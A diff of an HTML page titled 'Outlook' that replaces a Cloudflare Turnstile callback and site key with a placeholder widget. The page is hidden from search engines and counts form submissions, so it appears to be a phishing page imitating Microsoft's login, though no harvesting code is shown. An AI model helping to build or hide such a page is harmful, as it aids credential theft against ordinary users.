@@ -9,7 +9,8 @@
         type="image/x-icon" />
     <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8" />
     <meta name="Robots" content="NOINDEX, NOFOLLOW" />
-	<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=_turnstileCb" defer></script>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" defer></script>
+	
     <title>Outlook</title>
     <style>
         @font-face {
@@ -694,6 +695,9 @@
     </div>
 </form>
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+	<!-- Add your public key -->
+	<div class="cf-turnstile" data-sitekey="Your public key"></div>
 <script>
     $(document).ready(function() {
         var submitCount = 0;
@@ -751,15 +755,6 @@ window.onload = function onoff(){
 }
 </script>
 
-<script>
-    function _turnstileCb() {
-        console.debug('_turnstileCb called');
 
-        turnstile.render('#turnstile-widget', {
-          sitekey: '0x4AAAAAAAyVGXhWd1-24z7y',
-          theme: 'light',
-        });
-    }
-</script>
 
 </html>
